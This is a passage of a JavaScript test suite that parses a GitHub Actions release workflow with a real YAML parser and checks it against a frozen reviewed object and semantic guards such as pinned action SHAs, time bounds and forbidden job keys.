// Structural invariants for .github/workflows/release-pilot.yml (#70 Slice A).
//
// ROUND 7 ENDED THE REGEX PARSER. Rounds 2–6 each patched a text-level validator, and round 7
// demonstrated the limitation is architectural: a QUOTED job id appended at the end of the file was
// a real sixth job to YAML — carrying `id-token: write` and a remote reusable workflow — while the
// regex parser still reported five jobs and zero errors. Quoted env keys, quoted action inputs and
// job-level `container:` were equally invisible. A validator that parses a different language than
// the consumer does validates nothing.
//
// The authoritative check is now: parse the workflow ONCE with a real, pinned YAML parser
// (duplicate keys and malformed documents refused), and require the parsed object to EQUAL the
// reviewed object below, key for key, value for value. Semantic guards run on the same parsed
// object — never on text — both to give named diagnostics and to police future deliberate edits of
// the reviewed object itself. Comments are the one thing YAML cannot see, so the disclosure test
// alone still reads raw text.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { parseDocument } from 'yaml';

const here = dirname(fileURLToPath(import.meta.url));
const WORKFLOW = join(here, '..', '.github', 'workflows', 'release-pilot.yml');
const raw = fs.readFileSync(WORKFLOW, 'utf8');

/**
 * THE REVIEWED OBJECT. Any semantic change to the workflow — a key, a value, a step, a job — fails
 * the suite until this literal is updated deliberately, under review. Generated from the reviewed
 * YAML and frozen here; it is the closed schema, not a snapshot convenience.
 */
const EXPECTED_WORKFLOW = {
  "name": "Release Pilot",
  "run-name": "cba-release ${{ inputs.mode }} ${{ inputs.correlation_id }}",
  "on": {
    "workflow_dispatch": {
      "inputs": {
        "release_sha": {
          "description": "Full 40-character commit SHA to release; must be an ancestor of main",
          "required": true,
          "type": "string"
        },
        "correlation_id": {
          "description": "Caller-generated id for THIS decision, cba-70- plus 32 lowercase hex (a CSPRNG value, per the runbook standard); it becomes part of the run name and of every uploaded artifact",
          "required": true,
          "type": "string"
        },
        "mode": {
          "description": "bind_only terminates after the preflight (no cloud authority beyond the read-only preflight role); dev_only is the plan/deploy path; abandon deletes the change sets of a DECLINED plan and nothing else — pilot promotion is mechanically blocked until O1/O2, the smokes and the live SNS/KMS proof are implemented",
          "required": true,
          "type": "choice",
          "options": [
            "bind_only",
            "dev_only",
            "abandon"
          ]
        }
      }
    }
  },
  "permissions": {
    "contents": "read"
  },
  "concurrency": {
    "group": "release-dev",
    "cancel-in-progress": false
  },
  "jobs": {
    "global-preflight": {
      "name": "Release identity (shape, object type and ancestry)",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 5,
      "permissions": {
        "contents": "read"
      },
      "outputs": {
        "release_sha": "${{ steps.identity.outputs.release_sha }}"
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "main",
            "fetch-depth": 0,
            "persist-credentials": false
          }
        },
        {
          "name": "Validate release identity",
          "id": "identity",
          "env": {
            "RELEASE_SHA": "${{ inputs.release_sha }}",
            "CORRELATION_ID": "${{ inputs.correlation_id }}"
          },
          "run": "set -euo pipefail\n# Shape FIRST, before any git invocation, and over ALL forty characters: a `[0-9a-f]*`\n# pattern validates only the first one, so \"a\" followed by 39 \"Z\"s passed it.\nif [ \"${#RELEASE_SHA}\" -ne 40 ] || [ -n \"${RELEASE_SHA//[0-9a-f]/}\" ]; then\n  echo \"::error::release_sha must be exactly 40 lowercase hex characters — a commit OID, never a ref name\"\n  exit 1\nfi\n# The correlation id has a CLOSED grammar (SPEC-LANE-006) and is refused here, before\n# any credentialed stage: prefix, then exactly 32 lowercase hex.\nsuffix=\"${CORRELATION_ID#cba-70-}\"\nif [ \"$suffix\" = \"$CORRELATION_ID\" ] || [ \"${#suffix}\" -ne 32 ] || [ -n \"${suffix//[0-9a-f]/}\" ]; then\n  echo \"::error::correlation_id must match cba-70- followed by exactly 32 lowercase hex characters\"\n  exit 1\nfi\ngit fetch --quiet origin main\n# The object must BE a commit: a 40-hex tag or blob OID is not a release.\ntype=$(git cat-file -t \"$RELEASE_SHA\" 2>/dev/null || true)\nif [ \"$type\" != \"commit\" ]; then\n  echo \"::error::release_sha does not name a commit object in main's history\"\n  exit 1\nfi\nresolved=$(git rev-parse --verify \"$RELEASE_SHA^{commit}\")\nif [ \"$resolved\" != \"$RELEASE_SHA\" ]; then\n  echo \"::error::release_sha did not resolve to itself; refusing an ambiguous name\"\n  exit 1\nfi\nif ! git merge-base --is-ancestor \"$resolved\" origin/main; then\n  echo \"::error::release_sha is not an ancestor of main — only reviewed, merged commits are releasable\"\n  exit 1\nfi\n# Emit the RESOLVED OID, never the original input: downstream jobs pin to this output,\n# so a ref moved between validation and a later checkout has nothing left to move.\necho \"release_sha=$resolved\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "dev-preflight": {
      "name": "Deploy preflight (dev)",
      "needs": [
        "global-preflight"
      ],
      "if": "needs.global-preflight.result == 'success'",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 5,
      "environment": "dev",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "outputs": {
        "context_digest": "${{ steps.preflight.outputs.context_digest }}",
        "manifest": "${{ steps.preflight.outputs.manifest }}",
        "manifest_digest": "${{ steps.preflight.outputs.manifest_digest }}"
      },
      "defaults": {
        "run": {
          "working-directory": "infra/aws"
        }
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22,
            "cache": "npm",
            "cache-dependency-path": "infra/aws/package-lock.json"
          }
        },
        {
          "name": "Install dependencies",
          "run": "npm ci"
        },
        {
          "name": "Unit tests (context helpers and preflight)",
          "run": "npm test"
        },
        {
          "name": "Synthesize the bound context (credential-free, BEFORE any AWS authority)",
          "env": {
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}"
          },
          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\n"
        },
        {
          "name": "Configure AWS credentials (read-only preflight role)",
          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
          "with": {
            "role-to-assume": "${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}",
            "aws-region": "${{ vars.AWS_REGION }}",
            "mask-aws-account-id": true
          }
        },
        {
          "name": "Evaluate PREFLIGHT-1 and PREFLIGHT-2",
          "id": "preflight",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "TARGET_REGION": "${{ vars.AWS_REGION }}",
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}",
            "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"
          },
          "run": "set -euo pipefail\nnode bin/deploy-preflight.js \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-dev.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-dev.json\")\" >> \"$GITHUB_OUTPUT\"\n# SPEC-DEPLOY-019: the §6b bundle digest of the COMPLETE manifest — what a plan_only\n# authorization must name. Computed by the same pinned envelope the entrypoint\n# recomputes at the gate, so the two can never drift apart silently.\nmanifest_digest=$(node -e '\n  const { manifestBundleDigest } = require(\"./lib/deploy-preflight\");\n  const { deepSortKeys } = require(\"./bin/deploy-release\");\n  process.stdout.write(manifestBundleDigest(require(process.argv[1]), deepSortKeys));\n' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"manifest_digest=$manifest_digest\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "bind-stage": {
      "name": "Bind — publish the release manifest as evidence (no cloud authority)",
      "needs": [
        "global-preflight",
        "dev-preflight"
      ],
      "if": "needs.dev-preflight.result == 'success' && inputs.mode == 'bind_only'",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 5,
      "permissions": {
        "contents": "read"
      },
      "steps": [
        {
          "name": "Assemble the binding artifact",
          "env": {
            "MANIFEST": "${{ needs.dev-preflight.outputs.manifest }}",
            "MANIFEST_DIGEST": "${{ needs.dev-preflight.outputs.manifest_digest }}",
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "CORRELATION_ID": "${{ inputs.correlation_id }}"
          },
          "run": "set -euo pipefail\nmkdir -p \"$RUNNER_TEMP/binding\"\nnode -e '\n  const manifest = JSON.parse(process.env.MANIFEST);\n  const binding = {\n    correlationId: process.env.CORRELATION_ID,\n    releaseSha: process.env.RELEASE_SHA,\n    manifestDigest: process.env.MANIFEST_DIGEST,\n    manifest,\n  };\n  if (!/^[0-9a-f]{64}$/.test(binding.manifestDigest ?? \"\")) {\n    throw new Error(\"the binding is the digest birthplace - without it there is nothing for an authorization to name\");\n  }\n  require(\"fs\").writeFileSync(process.argv[1], JSON.stringify(binding, null, 2) + \"\\n\");\n' \"$RUNNER_TEMP/binding/binding.json\"\n"
        },
        {
          "name": "Upload the binding artifact",
          "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
          "with": {
            "name": "binding",
            "path": "${{ runner.temp }}/binding/binding.json",
            "if-no-files-found": "error",
            "retention-days": 90
          }
        }
      ]
    },
    "dev-stage": {
      "name": "Dev stage — deploy AWS (dev)",
      "needs": [
        "global-preflight",
        "dev-preflight"
      ],
      "if": "needs.dev-preflight.result == 'success' && (inputs.mode == 'dev_only' || inputs.mode == 'abandon')",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 15,
      "environment": "dev",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "outputs": {
        "evidence": "${{ steps.evidence.outputs.evidence }}",
        "mode": "${{ steps.evidence.outputs.mode }}"
      },
      "defaults": {
        "run": {
          "working-directory": "infra/aws"
        }
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22,
            "cache": "npm",
            "cache-dependency-path": "infra/aws/package-lock.json"
          }
        },
        {
          "name": "Install dependencies",
          "run": "npm ci"
        },
        {
          "name": "Synthesize the bound context (credential-free, BEFORE any AWS authority)",
          "env": {
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}"
          },
          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\n"
        },
        {
          "name": "Configure AWS credentials (dev deploy role)",
          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
          "with": {
            "role-to-assume": "${{ secrets.AWS_DEPLOY_ROLE_ARN }}",
            "aws-region": "${{ vars.AWS_REGION }}",
            "mask-aws-account-id": true
          }
        },
        {
          "name": "Deploy the verified release through the sanctioned entrypoint",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "TARGET_REGION": "${{ vars.AWS_REGION }}",
            "MANIFEST_JSON": "${{ needs.dev-preflight.outputs.manifest }}",
            "CBA_CLOUD_GATE": "${{ vars.CBA_CLOUD_GATE }}",
            "CORRELATION_ID": "${{ inputs.correlation_id }}",
            "DISPATCH_MODE": "${{ inputs.mode }}",
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}"
          },
          "run": "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode bin/deploy-release.js \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --artifact-out \"$RUNNER_TEMP/release-evidence/evidence.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\n"
        },
        {
          "name": "Publish the evidence record as job outputs",
          "id": "evidence",
          "if": "${{ !cancelled() }}",
          "run": "set -euo pipefail\nfile=\"$RUNNER_TEMP/release-evidence/evidence.json\"\nmode=\"\"\nif [ -f \"$file\" ]; then\n  mode=$(node -e 'process.stdout.write(String(JSON.parse(require(\"fs\").readFileSync(process.argv[1], \"utf8\")).mode ?? \"\"))' \"$file\")\n  {\n    echo \"evidence<<CBA_EVIDENCE_EOF\"\n    cat \"$file\"\n    echo \"CBA_EVIDENCE_EOF\"\n  } >> \"$GITHUB_OUTPUT\"\nfi\necho \"mode=$mode\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "dev-evidence": {
      "name": "Dev evidence — upload the run's record (no cloud authority)",
      "needs": [
        "dev-stage"
      ],
      "if": "always() && needs.dev-stage.result != 'skipped' && needs.dev-stage.result != 'cancelled'",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 5,
      "permissions": {
        "contents": "read"
      },
      "steps": [
        {
          "name": "Materialize the evidence file under its reviewed name",
          "env": {
            "EVIDENCE": "${{ needs.dev-stage.outputs.evidence }}",
            "MODE": "${{ needs.dev-stage.outputs.mode }}",
            "CORRELATION_ID": "${{ inputs.correlation_id }}"
          },
          "run": "set -euo pipefail\nmkdir -p \"$RUNNER_TEMP/evidence\"\n# ROUND I3-3: transport loss is a RED RUN, never a silent gap. A mode on the record with\n# no evidence output means the channel dropped or suppressed the value AFTER a cloud\n# effect may have happened — the one state that must never pass quietly.\nif [ -n \"$MODE\" ] && [ -z \"$EVIDENCE\" ]; then\n  echo \"::error::the evidence output vanished in transport (mode=$MODE, evidence empty) — the record exists in dev-stage but did not arrive; do not trust this run's artifacts\"\n  exit 1\nfi\nif [ -z \"$EVIDENCE\" ]; then\n  echo \"no evidence record was produced (the run refused before the entrypoint); nothing to materialize\"\n  exit 0\nfi\n# The record must arrive INTACT: parseable JSON whose correlation is THIS dispatch's.\nprintf '%s\\n' \"$EVIDENCE\" | node -e '\n  let raw = \"\";\n  process.stdin.on(\"data\", (c) => { raw += c; });\n  process.stdin.on(\"end\", () => {\n    const record = JSON.parse(raw);\n    if (record.schema !== \"cba-release-evidence/1\") throw new Error(\"unexpected evidence schema\");\n    if (record.correlationId !== process.env.CORRELATION_ID) throw new Error(\"evidence correlation does not match this dispatch\");\n  });\n'\ncase \"$MODE\" in\n  plan_only) name=plan.json ;;\n  deploy) name=deploy.json ;;\n  abandon) name=abandon.json ;;\n  *) name=evidence.json ;;\nesac\nprintf '%s\\n' \"$EVIDENCE\" > \"$RUNNER_TEMP/evidence/$name\"\n"
        },
        {
          "name": "Upload the plan artifact",
          "if": "${{ needs.dev-stage.outputs.mode == 'plan_only' }}",
          "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
          "with": {
            "name": "plan",
            "path": "${{ runner.temp }}/evidence/plan.json",
            "if-no-files-found": "error",
            "retention-days": 90
          }
        },
        {
          "name": "Upload the deploy artifact",
          "if": "${{ needs.dev-stage.outputs.mode == 'deploy' }}",
          "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
          "with": {
            "name": "deploy",
            "path": "${{ runner.temp }}/evidence/deploy.json",
            "if-no-files-found": "error",
            "retention-days": 90
          }
        },
        {
          "name": "Upload the abandon artifact",
          "if": "${{ needs.dev-stage.outputs.mode == 'abandon' }}",
          "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
          "with": {
            "name": "abandon",
            "path": "${{ runner.temp }}/evidence/abandon.json",
            "if-no-files-found": "error",
            "retention-days": 90
          }
        },
        {
          "name": "Upload refusal evidence (any mode without a reviewed artifact name)",
          "if": "${{ needs.dev-stage.outputs.mode != 'plan_only' && needs.dev-stage.outputs.mode != 'deploy' && needs.dev-stage.outputs.mode != 'abandon' }}",
          "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
          "with": {
            "name": "evidence",
            "path": "${{ runner.temp }}/evidence/evidence.json",
            "if-no-files-found": "ignore",
            "retention-days": 90
          }
        }
      ]
    },
    "pilot-preflight": {
      "name": "Deploy preflight (pilot)",
      "needs": [
        "global-preflight",
        "dev-preflight",
        "dev-stage"
      ],
      "if": "needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 5,
      "environment": "pilot",
      "permissions": {
        "contents": "read",
        "id-token": "write"
      },
      "outputs": {
        "context_digest": "${{ steps.preflight.outputs.context_digest }}",
        "manifest": "${{ steps.preflight.outputs.manifest }}"
      },
      "defaults": {
        "run": {
          "working-directory": "infra/aws"
        }
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22,
            "cache": "npm",
            "cache-dependency-path": "infra/aws/package-lock.json"
          }
        },
        {
          "name": "Install dependencies",
          "run": "npm ci"
        },
        {
          "name": "Synthesize the bound context (credential-free, BEFORE any AWS authority)",
          "env": {
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}"
          },
          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=pilot \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\n"
        },
        {
          "name": "Configure AWS credentials (read-only preflight role)",
          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
          "with": {
            "role-to-assume": "${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}",
            "aws-region": "${{ vars.AWS_REGION }}",
            "mask-aws-account-id": true
          }
        },
        {
          "name": "Evaluate PREFLIGHT-1 and PREFLIGHT-2",
          "id": "preflight",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "TARGET_REGION": "${{ vars.AWS_REGION }}",
            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}",
            "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"
          },
          "run": "set -euo pipefail\nnode bin/deploy-preflight.js \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-pilot.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-pilot.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-pilot.json\")\" >> \"$GITHUB_OUTPUT\"\n"
        }
      ]
    },
    "pilot-stage": {
      "name": "Pilot stage (not implemented in Slice A)",
      "needs": [
        "global-preflight",
        "dev-stage",
        "pilot-preflight"
      ],
      "if": "needs.pilot-preflight.result == 'success'",
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 5,
      "environment": "pilot",
      "permissions": {
        "contents": "read"
      },
      "steps": [
        {
          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
          "with": {
            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
          "with": {
            "node-version": 22
          }
        },
        {
          "name": "Verify the preflight manifest",
          "env": {
            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
            "CONTEXT_DIGEST": "${{ needs.pilot-preflight.outputs.context_digest }}",
            "MANIFEST_JSON": "${{ needs.pilot-preflight.outputs.manifest }}"
          },
          "run": "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"\n"
        },
        {
          "name": "Slice A stops here",
          "run": "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"\n"
        }
      ]
    }
  }
};

/** Parse as the consumer does: real YAML, duplicate keys refused, warnings refused. */
export function parseWorkflow(text) {
  const doc = parseDocument(text, { uniqueKeys: true });
  if (doc.errors.length > 0 || doc.warnings.length > 0) {
    return { errors: [...doc.errors, ...doc.warnings].map((e) => `the workflow is not clean YAML [${e.code}]`) };
  }
  return { wf: doc.toJS() };
}

/** Every path at which two parsed objects differ — the diagnostic half of deep equality. */
function objectDiff(expected, actual, base = '') {
  if (expected === actual) return [];
  const isObj = (x) => x !== null && typeof x === 'object';
  if (!isObj(expected) || !isObj(actual) || Array.isArray(expected) !== Array.isArray(actual)) {
    return [base || '(root)'];
  }
  const paths = [];
  for (const key of new Set([...Object.keys(expected), ...Object.keys(actual)])) {
    const p = Array.isArray(expected) ? `${base}[${key}]` : base ? `${base}.${key}` : key;
    if (!(key in expected)) paths.push(`${p} (unreviewed addition)`);
    else if (!(key in actual)) paths.push(`${p} (reviewed content removed)`);
    else paths.push(...objectDiff(expected[key], actual[key], p));
  }
  return paths;
}

/** The ONLY success expressions a job may carry; see rounds 2–3 for why the grammar is closed. */
const IF_GRAMMAR =
  /^(needs\.[A-Za-z_][\w-]*\.result == 'success'( && needs\.[A-Za-z_][\w-]*\.result == 'success')*( && (inputs\.mode == '(dev_then_pilot|dev_only|bind_only)'|\(inputs\.mode == 'dev_only' \|\| inputs\.mode == 'abandon'\)))?|always\(\) && needs\.dev-stage\.result != 'skipped' && needs\.dev-stage\.result != 'cancelled')$/;

/** Job-level keys that hand execution or environment to something nobody reviewed. */
const FORBIDDEN_JOB_KEYS = ['uses', 'container', 'services', 'env', 'strategy', 'secrets', 'continue-on-error'];

/** Every job is time-bounded (design §1: preflights 5, deploys 15; the pilot placeholder runs no
 * deploy and is bounded like a preflight). An unbounded job that hangs keeps its OIDC authority
 * alive until GitHub's default limit — hours, not minutes. */
const EXPECTED_TIMEOUTS = { 'global-preflight': 5, 'dev-preflight': 5, 'bind-stage': 5, 'dev-stage': 15, 'dev-evidence': 5, 'pilot-preflight': 5, 'pilot-stage': 5 };

const DEPLOY_COMMAND = /\bcdk\s+deploy\b|\bopennextjs-cloudflare\s+deploy\b|\bwrangler\s+deploy\b/;

/**
 * Every rule, evaluated on the PARSED workflow.
 * @returns {string[]} one message per violation; empty means the workflow holds.
 */
export function releaseLaneErrors(text) {
  const parsed = parseWorkflow(text);
  if (parsed.errors) return parsed.errors;
  const wf = parsed.wf;
  const errors = [];

  // ---- the authoritative closed schema -------------------------------------------------------
  for (const p of objectDiff(EXPECTED_WORKFLOW, wf)) {
    errors.push(`the workflow differs from the reviewed object at ${p}`);
  }

  // ---- semantic guards, on the parsed object -------------------------------------------------
  // Redundant while the object equals the reviewed one — deliberately: they police future edits of
  // EXPECTED_WORKFLOW itself, and they give the named diagnostics the snapshot diff cannot.
  const on = wf.on ?? {};
  if (!on.workflow_dispatch || Object.keys(on).length !== 1) {
    errors.push('the lane must be triggered by workflow_dispatch and nothing else');
  }
  // SLICE B1 + I2: promotion is MECHANICALLY blocked. `mode` may offer ONLY the reviewed
  // NON-PILOT set — bind_only (terminates after the preflight) and dev_only — because the pilot
  // jobs' success expressions require dev_then_pilot, so with that option absent they are
  // unreachable. Restoring dev_then_pilot is the promotion slice's deliberate act, together with
  // O1/O2, the smokes and the live SNS/KMS proof; until then it is refused HERE BY NAME, so the
  // reviewed-object diff cannot be the only thing standing when that edit arrives.
  const modeOptions = on.workflow_dispatch?.inputs?.mode?.options ?? [];
  if (JSON.stringify(modeOptions) !== JSON.stringify(['bind_only', 'dev_only', 'abandon'])) {
    errors.push('promotion is mechanically blocked: mode must offer only the reviewed non-pilot set [bind_only, dev_only, abandon] until O1/O2, the smokes and the SNS/KMS proof land');
  }
  // SPEC-LANE-006: the run is identifiable from run metadata alone. The run name is EXACTLY the
  // closed string bin/resolve-run.mjs matches by equality — nothing prepended, nothing appended.
  if (wf['run-name'] !== 'cba-release ${{ inputs.mode }} ${{ inputs.correlation_id }}') {
    errors.push('the run name must be exactly the closed cba-release string the resolver matches by equality');
  }
  // …and the correlation id is a REQUIRED dispatch input with the closed grammar validated in
  // the global preflight before any credentialed stage.
  const corr = on.workflow_dispatch?.inputs?.correlation_id;
  if (!corr || corr.required !== true || corr.type !== 'string') {
    errors.push('correlation_id must be a required string dispatch input (SPEC-LANE-006)');
  }
  // Releases serialize PER ENVIRONMENT (Slice B1 review). The lock must be the LITERAL group —
  // a group derived from inputs (the old release-pilot-${{ inputs.release_sha }}) gives two
  // different SHAs two different groups, and two releases mutate dev concurrently. The promotion
  // slice adds release-pilot alongside, through review of this rule.
  if (JSON.stringify(wf.concurrency) !== JSON.stringify({ group: 'release-dev', 'cancel-in-progress': false })) {
    errors.push('releases must serialize per environment: concurrency is the literal release-dev lock with cancel-in-progress false, never derived from inputs');
  }
  const jobs = wf.jobs ?? {};
  const ancestorsOf = (name, seen = new Set()) => {
    const needs = [].concat(jobs[name]?.needs ?? []);
    for (const n of needs) {
      if (!seen.has(n)) {
        seen.add(n);
        ancestorsOf(n, seen);
      }
    }
    return seen;
  };

  for (const [name, job] of Object.entries(jobs)) {
    const boundedTo = EXPECTED_TIMEOUTS[name];
    if (boundedTo === undefined) {
      errors.push(`job "${name}" is not in the reviewed job set and has no reviewed time bound`);
    } else if (job?.['timeout-minutes'] !== boundedTo) {
      errors.push(`job "${name}" must be bounded to exactly ${boundedTo} minutes — an unbounded job retains its OIDC authority until GitHub's default limit`);
    }
    for (const key of FORBIDDEN_JOB_KEYS) {
      if (job && Object.hasOwn(job, key)) {
        errors.push(`job "${name}" carries job-level ${key}, which hands execution to something unreviewed`);
      }
    }
    for (const step of job?.steps ?? []) {
      if (step.uses && !/@[0-9a-f]{40}$/.test(step.uses)) {
        errors.push(`job "${name}" pins an action to a mutable ref — a full commit SHA is required`);
      }
      if (typeof step.run === 'string' && DEPLOY_COMMAND.test(step.run)) {
        errors.push(`job "${name}" invokes a raw deploy command; deployment goes only through deploy-release.js`);
      }
    }
    // The sanctioned entrypoint carries its own obligations (Slice B1): the job that invokes
